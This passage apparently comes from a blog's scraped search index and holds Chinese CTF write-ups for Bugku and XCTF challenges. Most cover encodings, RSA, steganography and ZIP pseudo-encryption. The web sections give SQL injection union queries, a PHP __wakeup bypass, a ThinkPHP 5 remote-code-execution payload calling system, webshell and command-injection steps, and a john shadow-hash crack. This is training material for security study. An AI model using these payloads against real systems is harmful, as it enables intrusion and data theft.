00：文件注释长度\r00 00：磁盘开始号\r00 00：内部文件属性\r20 00 00 00：外部文件属性\r00 00 00 00：局部头部偏移量\r压缩源文件目录结束标志：\r50 4B 05 06：目录结束标记\r00 00：当前磁盘编号\r00 00：目录区开始磁盘编号\r01 00：本磁盘上纪录总数\r01 00：目录区中纪录总数\r59 00 00 00：目录区尺寸大小\r3E 00 00 00：目录区对第一张磁盘的偏移量\r00 00：ZIP 文件注释长度\r找到头文件标记50 4B 03 04与文件头标记50 4B 01 02，将后面对应的全局方式位标记00 09改为00 00破解伪加密，保存后成功打开flag.txt。\n获得flag。\n告诉你个秘密  Des:636A56355279427363446C4A49454A7154534230526D6843 56445A31614342354E326C4B4946467A5769426961453067。\n 数字范围0-9，字母范围A-E。\n十六进制转字符串。\ncjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g\rBase64转字符串。\nr5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM\r这个东西，看看键盘，刚好把中间的键给围了起来。\nTONGYUAN\r获得flag。\n这不是md5  Des:666c61677b616537333538376261353662616566357d。\n 数字范围1-8，字母范围b-d。\n十六进制转文本。\n获得flag。\n贝斯家族  Des:@iH\u0026lt;,{bdR2H;i6*Tm,Wx2izpx2!。\n 都说了是Base编码了，本菜鸟一个个试，试出来是Base91编码，进行解码。\n获得flag。\n富强民主  Des:公正公正公正诚信文明公正民主公正法治法治友善平等和谐敬业和谐富强和谐富强和谐文明和谐平等公正公正和谐法治公正公正公正文明和谐民主和谐敬业和谐平等和谐敬业和谐敬业和谐和谐和谐公正法治友善法治。\n 这个\u0026hellip;查了一下，这是核心价值观编码。进行解码。\n获得flag。\npython  Des:N/A。\n 给了两个python代码，附上。\n暂时解不出\u0026hellip;\n进制转换  Des:二进制、八进制、十进制、十六进制，你能分的清吗？\n d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e\r思路：先把所有数据转换为统一的形式，再转换为字符串。这里转为十六进制。\n十六进制转字符串。\n获得flag。\naffine  Des:y = 17*x-8 flag{szzyfimhyzd}。\n affine为仿射的意思，那么这就是仿射加密了。\n上脚本。\ns = \u0026#39;szzyfimhyzd\u0026#39; list = [] for i in s: list.append(ord(i) - 97) flag = \u0026#39;\u0026#39; for i in list: for j in range(0, 26): c = (17 * j - 8) % 26 if (c == i): flag += chr(j + 97) print(flag) 获得flag。\nCrack it  Des:破解该文件，获得密码。\n 给了一个shadow文件，记事本打开看看，内容：\nroot:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7:::\r这个需要应该是破解用户密码，使用kali的john工具，命令：\njohn shadow\r结果：\n可以发现密码为hellokitty。\n获得flag。\nrsa  Des:N/A。\n N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597\re : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619\renc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192\r暂时无解，等有空再做。\n来自宇宙的信号  Des:银河战队出击。\n 搜索标准银河字母，找到对应表。\n对应下来就是：\nnopqrst\r获得flag。\nReverse 入门逆向  Des:N/A。\n 用IDA打开看看，定位到main函数。\n有很多的mov指令，66h为f，6Ch为l，猜测这一串就是flag，点击对应的值按R进行转换。\n获得flag。\nEasy_vb  Des:N/A。\n IDA打开文件，上下翻一下。\n获得flag。\nEasy_Re  Des:Hint: 1.逆向常用的工具有IDA 、ollydbg。\n IDA打开文件，挨个看看。\n搜索CTF。\n双击定位去看看。\n这里的xmmword和dq可以转化成字符串，选中按R进行转换。\n将字符串转换为合理的顺序。\n获得flag。\n游戏过关  Des:N/A。\n 先用PEiD看看，\n社工 密码  DES:姓名：张三，生日：19970315。\n 唔，因为是第一个题，应该不会太难，猜测内容为zs19970315。\n获得flag。\nPwn pwn1  Des:nc 114.116.54.89 10001。\n ","permalink":"https://oopsdc.github.io/post/bugku/","summary":"Bugku Web Web1  Des:flag{}。\n 查看源码即可。\nWeb2  Des:输入验证码即可得到flag。\n 输入框有输入长度限制，在控制台修改长度即可。\nWeb3  Des:flag{}。\n 通过get传参，按照题目要求直接传入\n?what=flag\rWeb4  Des:post。\n 方法1 利用hackbar直接post传参。\n方法2 利用burp抓包传值。\n方法3 编写python脚本。\nimport requests s = requests.Session() r = s.get(\u0026#34;\u0026lt;url\u0026gt;\u0026#34;) value = {\u0026#39;what\u0026#39;:\u0026#39;flag\u0026#39;} r = s.post(\u0026#34;\u0026lt;url\u0026gt;\u0026#34;, value) print(r.text) 题目更新  Des:看看源代码吧。\n 查看源代码，发现有两串编码字符串。\n分别对两个字符串进行URL解码：\n按照代码含义将其组合起来：\n放到控制台Console里排版：\n将if判断里与a.value判等的值输入提交框，提交。\n获得flag。\nWeb5  Des:矛盾。\n $num = $_GET[\u0026#39;num\u0026#39;]; if (!isnumeric($num)) { echo $num; if ($num == 1) echo \u0026#39;flag{********}\u0026#39;; } 利用1a绕过，例：","title":"Bugku"},{"content":"攻防世界 Web view source  Des:X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。\n 查看页面源码。\n获得flag。\nrobots  Des:X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。\n 在URL后加上robots.txt，得到一个php页面提示，访问对应php文件。\n获得flag。\nbackup  Des:X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n 尝试backup.php，无效。\n使用御剑扫描后台，得到index.php.bak，输入后下载备份文件，cat查看。\n获得flag。\ncookie  Des:X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？\n 使用burp抓包，得到cookie.php。\n继续使用burp抓包，查看Response。\n获得flag。\ndisable_button  Des:N/A。\n 页面的flag按钮无响应，猜测被禁用，查看控制台元素。\n\u0026lt;input class=\u0026quot;btn btn-default\u0026quot; disabled\u0026gt;\n将此处的disabled前三字符删除，按下按钮。\n获得flag。\nweak_auth  Des:小宁写了一个登陆验证页面，随手就设了一个密码。\n 查看源码。\n\u0026lt;from class=\u0026quot;form-inline\u0026quot; method=\u0026quot;post\u0026quot; action=\u0026quot;./check.php\u0026quot;\u0026gt;\n有一个验证页面，访问它。\n页面空白，查看源码，提示。\n\u0026lt;!--maybe you need a dictionary--\u0026gt;\n这道题或许不需要字典？\n尝试御剑扫描，无果。\n好的我错了，随机输入用户名和密码，使用burp抓包，response显示用户名必须为admin，初次爆破无果，手动尝试123456，正确\u0026hellip;.如果尝试继续用字典的话还是可以爆出来，只是比较费时间。\n获得flag。\nsimple_php  Des:小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。\n \u0026lt;?php show_source(__FILE__); include(\u0026#34;config.php\u0026#34;); $a = @$_GET[\u0026#39;a\u0026#39;]; $b = @$_GET[\u0026#39;b\u0026#39;]; if ($a == 0 and $a) { echo $flag1; } if (is_numeric($b)) { exit(); } if ($b \u0026gt; 1234) { echo $flag2; } ?\u0026gt;包含文件config.php，查看源码，无隐藏信息。\n页面通过GET传参，根据条件a=0且a为真，b不能为数字且大于1234，添加?a=0e1\u0026amp;b=12346s，获得flag\nget_post  Des:X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？\n 跟着提示走，URL后添加?a=1。\nhackbar进行POST传参。\n获得flag。\nxff_referer  Des:X老师告诉小宁其实xff和referer是可以伪造的。\n X-Forwarded-For：123.123.123.123\nburp抓包，在Request添加Referer:https://www.google.com，查看Response。\n获得flag。\nwebshell  Des:小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。\n 御剑扫描后台，没用\u0026hellip;\n查了一下资料，需要其他工具，选择中国蚁剑。\n配好之后添加题目网址，输入密码：shell。\n点击进入，查看flag.txt。\n获得flag。\ncomman_execution  Des:小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。\n 给出一个ping窗口，尝试本地回环。\n命令可以正常执行，尝试拼接。\n可以正常执行拼接命令，查看当前目录所有文件\n没用，而且只能在当前目录执行命令，尝试搜索当前用户所有txt文档。\n发现flag，根据路径使用cat命令查看flag.txt。\n获得flag。\nsimple_js  Des:小宁发现了一个网页，但却一直输不对密码。\n X-Forwarded-For：220.249.52.133\n要求输入密码，随机输入后显示错误，查看网页源码\n代码审计，加了很多不必要的代码，将dechiffre中的十六进制转文本，得到55,56,54,79,115,69,114,116,107,49,50。\ns = [55,56,54,79,115,69,114,116,107,49,50] for i in s: print(chr(i), end=\u0026#39;\u0026#39;) 输出结果786OsErtk12，加上给定flag格式。\n获得flag。\nNewsCenter  Des:N/A。\n 只给了一个输入框，源码无提示。\n尝试查看是否存在sql注入。\nand 1=1 页面无回显，初步判断存在。\n看看表。\n\u0026#39;and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS# 最下面有一个secret_table，这显然就是我们需要的信息。\n查看表的列名和数据类型。\n\u0026#39;and 0 union select 1,column_name,data_type from information_schema.columns where table_name=\u0026#39;secret_table\u0026#39;# 得到：\nid\rint\rfl4g\rvarchar\r获取字段内容：\n\u0026#39;and 0 union select 1,2,fl4g from secret_table# Web进阶 baby_web  Des:想想初始页面是哪个。\n 页面为1.php。\ndirb扫描目录，初始页面被重定向到1.php\n尝试访问index.php，在控制台查看访问记录。\n获得flag。\nTraining-WWW-Robots  Des:N/A。\n 在URL后加上robots.txt。\n尝试访问fl0g.php。\n获得flag。\nunserialize3  Des:N/A。\n  PHP__wakeup()函数漏洞\n在程序执行前，serialize() 函数会首先检查是否存在一个魔术方法 __sleep.如果存在，__sleep()方法会先被调用， 然后才执行串行化（序列化）操作。这个功能可以用于清理对象，并返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致 一个E_NOTICE错误。与之相反，unserialize()会检查是否存在一个wakeup方法。如果存在，则会先调用__wakeup方法，预先准备对象数据。但是这个__wakeup()是可以被绕过的。\n__wakeup 触发于 unserilize() 调用之前, 当反序列化时的字符串所对应的对象的数目被修改,wake 的函数就不会被调用. 并且不会重建为对象, 但是会触发其他的魔术方法。\n 本题使用code进行传参，利用__wakeup函数漏洞，当序列化字符串表示对象属性个数的值大于真实个数属性时就会跳过__wakeup的执行。\n先用php脚本跑出序列化字符串。\n\u0026lt;?php class xctf{ public $flag = \u0026#39;111\u0026#39;; public function __wakeup() { exit(\u0026#39;bad requests\u0026#39;); } } $c = new xctf(); print(serialize($c)); ?\u0026gt;结果：\nO:4:\u0026quot;xctf\u0026quot;:1:{s:4:\u0026quot;flag\u0026quot;;s:3:\u0026quot;111\u0026quot;;}\r给code传参：?code=O:4:\u0026quot;xctf\u0026quot;:2:{s:4:\u0026quot;flag\u0026quot;;s:3:\u0026quot;111\u0026quot;;}。\n获得flag。\nWeb php serialize  Des:N/A。\n 简单写个php代码。\n定义变量index.php?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==。\n获得flag。\nphp rce  Des:N/A。\n 查看控制台元素，无有用信息。\n御剑扫描后台，发现robots.txt。\n根据题目名称搜索Think PHP V5 rce漏洞\n发现补丁修改后的代码：\n从$controller分析，补丁对其名称进行了过滤，继续查看：\n代码对controller进行了实例化，进入到Loader部分查看：\n如果类name存在，进行实例化，并跟进getModuleAndClass：\n此函数将module和class返回，用于实例化，利用命名空间的特点，如果能够控制此处的class，即补丁内的controller，就可以实例化任何类。若将控制器设置为\\think\\App，可以构造payload调用其方法invokeFunction：\n接下来设置controller为\\think\\App：\n把result[1]的值传递到$controller中：\n寻找使用module的位置：\n$result来自$dispatch['module']，往前看\n跟踪routeCheck：\n发现解析URL并未进行安全检测。\n从Request::path()跟踪到pathinfo()：\nvar_info默认配置为s，可以通过$_GET['s']进行传参\n构造payload：\n?s=index/\\think\\App/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=system\u0026amp;vars[1][]=dir 获得flag。\nsupersqli  Des:随便注。\n 看源码。\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;easy_sql\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt; 取材于某次真实环境渗透，只说一句话：开发和安全缺一不可 \u0026lt;/h1\u0026gt; \u0026lt;!-- sqlmap是没有灵魂的 --\u0026gt; \u0026lt;form method=\u0026#34;get\u0026#34;\u0026gt; 姿势：\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;inject\u0026#34; value=\u0026#34;1\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 有过滤。\n可以堆叠注入。\nflag在1919810931114514这个表里面。查询表数据的方法有两种：1.页面默认查询的是`words表，需要将这两个表名互换；2.利用MySQL的预处理进行查询。\n知识点：\n1.MySQL表名为纯数字(或表名和保留字冲突时)，要加反引号，如：\nshow columns from `1919810931114514`\r2.MySQL官方将prepare、execute、deallocate统称为预处理语句。\n3.字符拼接函数可以绕过关键字检查，如这里利用的concat。\nMisc reverseMe  Des:N/A。\n 给了一张图片：\n放进ps翻转图片即可。\n获得flag。\nthis_is_flag  Des:Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}。\n 获得flag。\npdf  Des:菜猫给了菜狗一张图，说图下面什么都没有。\n 给了一个pdf文件，用binwalk看看。\n啥也没有，再用Acrobat软件查看pdf。\n诶，发现图片后面还有一个文本框，尝试把图片拖到一旁。\n获得flag。\ngive_you_flag  Des:菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包。\n 给了一个gif图片，查看后发现最后一针有一个二维码，用StegSolve逐帧看看。\n得到这一帧图片，发现缺少了二维码定位点，尝试自己画上去。\n扫描二维码。\n获得flag。\ngif  Des:菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机。\n 解压压缩包后获得104张图片，只有黑白两种颜色，猜测分别表示1和0？\n01100110 01101100 01100001 01100111 01111011 01000110 01110101 01001110 01011111 01100111 01101001 01000110 01111101\n然后通过python脚本转换一下。\n获得flag。\n掀桌子  Des:菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻。\n 分析给出的字符串，由0-9，a-f组成，两两分组转换成字节后均大于128，而ASCII码范围为0-127，将其减去128，python代码如下。\n获得flag。\n如来十三掌  Des:菜狗为了打败菜猫，学了一套如来十三掌。\n 给了一个docx文档，用binwalk查看一下信息。\nbinwalk -e 833e81c19b2b4726986bd6a606d64f3c.docx将文件分离出来。\n然后再怎么找也找不到路子做题，看了下wp，佛了。\n要用到与佛论禅进行解密。\n获得一串字符串，有点像Base64，但是解码后是乱码，想想题目，十三，尝试一下rot13。\n然后再进行Base64解码。\n获得flag。\nSimpleRAR  Des:菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)。\n 只给了文件flag.txt。\n可是除了这个文件啥也没有了呀\u0026hellip;\n用WinRAR打开压缩包试试（别问为什么，问就是套路）。\n上WinHex查看数据。\nhere之后的数据应该就是那张图片了，搜索一下rar每个块的文件头：0x74。\n将高亮处改为74，保存。图片出来了。\n一片纯白，按提示用ps查看图层，但显示打开错误\u0026hellip;用binwalk看看这是什么。\n改后缀为.gif，再尝试打开。\n只有两个空白图层，将它们分别保存后用StegSolve看看。\n图层1。\n图层2。\n两张被分割的二维码，没有定位符\u0026hellip;\n唉，拼接吧。本来想用ps的图层，然而学艺不精，丢在word里面拼接之后，再用画图工具弄上定位符。\n获得flag。\n坚持60s  Des:菜狗发现最近菜猫不爱理他，反而迷上了菜鸡。\n 这\u0026hellip;之前做过。\nbinwalk -e 9dc125bf1b84478cb14813d9bed6470c.jar将文件分离出来，然后切换至分离目录，grep -r \u0026quot;flag\u0026quot;。\n用记事本打开包含flag的文档，搜索flag。\n里面的内容是Base64编码，解码后进行提交。\n获得flag。\nbase64stego  Des:菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓。\n 题目给的压缩包里有一个加密文件，但是没有密码提示，用WinHex打开压缩包看看。\n伪加密，将高亮处改为00，保存。\n正常打开stego.txt，一大段Base64编码。\n进行Base64解码，获得一串无用字符串Steganography is the art and science of writing hidden messages in such a way that no one。\n是一道Base64隐写，附上python2.7脚本。\n获得flag。\next3  Des:今天是菜狗的生日，他收到了一个Linux系统光盘。\n 给了一个ext文件，是Linux系统文件，尝试挂载一下。此处的wsl kali由于配置环境不够，使用VMware kali虚拟机进行操作。\n挂载：mount f1fc23f5c743425d9e0073887c846d23 /mnt/。\n查找：find 'flag' /mnt/，发现有一个/mnt/O7avZhikgKgbF/flag.txt文件\n查看：cat /mnt/O7avZhikgKgbF/flag.txt。\nBase64解码。\n获得flag。\nstegano  Des:菜狗收到了图后很开心，玩起了pdf提交格式为flag{xxx}，解密字符需小写。\n 题目给了一个pdf文件，使用浏览器打开，Ctrl+A选中所有，将文本复制到记事本。\n没有规律，尝试摩斯密码，将A替换为.，B替换为-，python代码附上。\n得到一串摩斯加密，去这个网站解密，因为其他网站不是解不出来就是乱码\u0026hellip;然后对得到的字符串进行小写处理，python代码如下。\ns = \u0026#39;FLAG1NV151BL3M3554G3\u0026#39; print(s.lower()) 获得flag。\n功夫再高也怕菜刀  Des:菜狗决定用菜刀和菜鸡决一死战。\n 题目给了一个后缀为.pcapng的文件，用binwalk看看。\n使用命令binwalk -e acfff53ce3fa4e2bbe8654284dfc18e1.pcapng后得到一系列文件，有一个空的flag.txt文件，用Wireshark打开原始文件看看，查找flag.txt字段。\n第189个包、195个包、639个包、第641个包都一样。\n第1150个包，多了一张6666.jpg图片。\n右键第1150个包，追踪TCP数据流。\n把高亮及后面的数据进行复制，然后在WinHex里新建一个文件，粘贴过去，文件大小不要太小就行，格式选择ASCII Hex。\n然后Ctrl+S保存为jpg文件，打开后获得一个密码。\n然后我们将这个文件分离出来，命令：dd if=acfff53ce3fa4e2bbe8654284dfc18e1.pcapng of=1.zip skip=1422689 bs=1。\n按密码打开压缩包里的flag.txt。\n获得flag。\nsomethin_in_image  Des:N/A。\n Erik-Baleog-and-Olaf  Des:N/A。\n binwalk分析，为png图片，改后缀，使用StegSolve查看，绿1通道发现中间有一个二维码。\n截图保存二维码，继续放入StegSolve分通道查看，得到更清楚的二维码。\nhit-the-core  Des:N/A。\n 使用strings命令查看字符串，发现这么一段内容。\ncvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}\r前几个大写字母中间都隔了4个字符，上python输出一遍。\nglance-50  Des:N/A。\n 下载为一个gif图片，先看看属性。\n可知宽度明显不对，WinHex打开修改。\nCrypto flag in your hand  Des:N/A。\n base64  Des:元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。。\n 给了一个txt文档，内容：Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9，Base64解码。\n获得flag。\nCaesar  Des:你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了。\n 给了一个txt文档，内容：Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9，凯撒解密，尝试不同的位数。\n获得flag。\nMorse  Des:小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)。\n txt文档内容：11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110。\n上脚本。\n获得flag。\n不仅仅是Morse  Des:“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}。\n txt文档内容：先把/符号给替换成空格 ，然后进行莫斯解密，上脚本。\n解密内容：\nHHHH之后的字母全为A和B，猜测是培根加密，将之后的内容进行培根解密：\n获得flag。\n混合编码  Des:经过了前面那么多题目的历练，耐心细致在解题当中是 必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长 好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌 走向了下面的挑战。格式为cyberpeace{小写的你解出的答案}。\n txt内容：Base64解码内容：\nASCII解码：\nLzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw\rBase64解码：\n/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100\rASCII转字符：\nwelcometoattackanddefenceworld\r获得flag。\n幂数加密  Des:你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母}。\n txt内容：\n8842101220480224404014224202480122\r获得flag。\nRailfence  Des:被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。\n txt内容：\nccehgyaefnpeoobe{lcirg}epriec_ora_g\r用栅栏解密试试，开头有一点相似，但解不出来\u0026hellip;W型栅栏加密，解密网址，按照提示栏数为5。\n获得flag。\neasy RSA  Des:解答出来了上一个题目的你现在可是春风得意，你们走向了下一个题目所处的地方 你一看这个题目傻眼了，这明明是一个数学题啊！！！可是你的数学并不好。扭头看向小鱼，小鱼哈哈一笑 ，让你在学校里面不好好听讲现在傻眼了吧~来我来！三下五除二，小鱼便把这个题目轻轻松松的搞定了。flag格式为cyberpeace{小写的你解出的答案}。\n txt内容：\n在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17\r求解出d\r附上python代码。\n获得flag。\neasychallenge  Des:你们走到了一个冷冷清清的谜题前面，小鱼看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在了电脑屏幕上，你敲敲键盘，更改了几处地方，运行以后答案变出现在了电脑屏幕上。\n 题目给了一个pyc文件，需要进行反编译。在python环境配置好的基础上，pip install uncompyle进行工具安装，然后使用命令uncompyle filename进行反编译，得到如下源代码。\n根据代码写解密脚本。\n获得flag。\n转轮机加密  Des:你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊。 flag，是字符串，小写。\n 上网查询了一下转轮机加密，做题思路如下：\ntxt内容为：\n先根据密钥对各行进行替换。\n然后根据密文，对第一列元素进行排列，对每行元素进行循环。\n将每一列列出来。\nDes:中提到了二战，唯一读的通顺的就是\n18:FIREINTHEHOLE\r获得flag。\nNormal RSA  Des:你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光。\n 方法1 给了flag.enc和pubkey.pem两个文件，分别是密文和公钥，使用CTF-RSA_tool工具进行解密。\n命令：\n.\\solve.py --verbose -k .\\pubkey.pem --decrypt .\\flag.enc\r获得flag。\n方法2 pubkey.pem是openssl的文件类型，传统RSA公钥形式为(e,N)，用openssl解出e和N的值。kali自带openssl，使用命令 openssl rsa -pubin -text -modulus -in pubkey.pem对文件进行解析，或者使用这个网站。\n其中65537为e的值，C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD为N的十六进制值，将其转换为十进制，结果为87924348264132406875276140514499937145050893665602592992418171647042491658461。\n然后通过在线网站计算p值与q值。\np=275127860351348928173285174381581152299。\nq=319576316814478949870590164193048041239。\n安装rsatool，python setup.py install。\npython rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239，生成一个private文件。\nopenssl rsautl -decrypt -in flag.enc -inkey private.pem.\n获得flag。\neasy ECC  Des:转眼两个人又走到了下一个谜题的地方，这又是一种经典的密码学加密方式 而你刚好没有这个的工具，你对小鱼说“小鱼我知道数学真的很重要了，有了工具只是方便我们使用，懂了原理才能做到，小鱼你教我一下这个题怎么做吧！”在小鱼的一步步带领下，你终于明白了ECC 的基本原理，成功的解开了这个题目，两个人相视一笑，快步走向了下一个题目所在的位置。flag格式为cyberpeace{x+y的值}。\n txt内容：\n上脚本。\n获得flag。\nMobile easy-so  Des:N/A。\n Reverse insanity  Des:菜鸡觉得前面的题目太难了，来个简单的缓一下。\n 做法1 用IDA打开文件，Shift+F12。\n做法2 用记事本打开文件，搜索flag。\n获得flag。\n","permalink":"https://oopsdc.github.io/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/","summary":"攻防世界 Web view source  Des:X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。\n 查看页面源码。\n获得flag。\nrobots  Des:X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。\n 在URL后加上robots.txt，得到一个php页面提示，访问对应php文件。\n获得flag。\nbackup  Des:X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n 尝试backup.php，无效。\n使用御剑扫描后台，得到index.php.bak，输入后下载备份文件，cat查看。\n获得flag。\ncookie  Des:X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？\n 使用burp抓包，得到cookie.php。\n继续使用burp抓包，查看Response。\n获得flag。\ndisable_button  Des:N/A。\n 页面的flag按钮无响应，猜测被禁用，查看控制台元素。\n\u0026lt;input class=\u0026quot;btn btn-default\u0026quot; disabled\u0026gt;\n将此处的disabled前三字符删除，按下按钮。\n获得flag。\nweak_auth  